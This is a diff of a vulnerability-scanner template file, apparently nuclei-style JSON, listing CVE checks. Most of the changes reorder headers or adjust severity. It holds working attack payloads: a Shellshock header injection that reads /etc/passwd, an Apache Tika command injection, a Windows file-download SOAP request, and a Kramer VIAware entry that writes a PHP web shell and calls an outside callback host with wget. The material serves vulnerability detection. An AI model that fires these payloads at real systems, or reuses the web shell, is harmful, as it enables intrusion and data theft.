@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6270,11 +6270,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -10911,9 +10911,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -13784,6 +13784,21 @@
       ]
     },
     {
+      "id": "CVE-2021-25118",
+      "info": {
+        "name": "Yoast SEO < 17.3 - Unauthenticated Full Path Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-json/wp/v2/posts?per_page=1"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-25120",
       "info": {
         "name": "Easy Social Feed < 6.2.7 - Cross-Site Scripting",
@@ -15184,8 +15199,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -15249,6 +15264,21 @@
           "raw": [
             "PUT /SDK/webLanguage HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(id>webLib/x)</language>\n",
             "GET /x HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-36356",
+      "info": {
+        "name": "Kramer VIAware RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /ajaxPages/writeBrowseFilePathAjax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nradioBtnVal=%3C%3Fphp%0A++++++++if%28isset%28%24_GET%5B%27cmd%27%5D%29%29%0A++++++++%7B%0A++++++++++++system%28%24_GET%5B%27cmd%27%5D%29%3B%0A++++++++%7D%3F%3E&associateFileName=%2Fvar%2Fwww%2Fhtml%2F{{randstr}}.php\n",
+            "GET /{{randstr}}.php?cmd=sudo%20rpm%20--eval%20'%25%7Blua:os.execute(%22wget%20http://{{interactsh-url}}%22)%7D' HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -16856,7 +16886,7 @@
       "id": "CVE-2022-0591",
       "info": {
         "name": "Formcraft3 < 3.8.28 - Unauthenticated SSRF",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
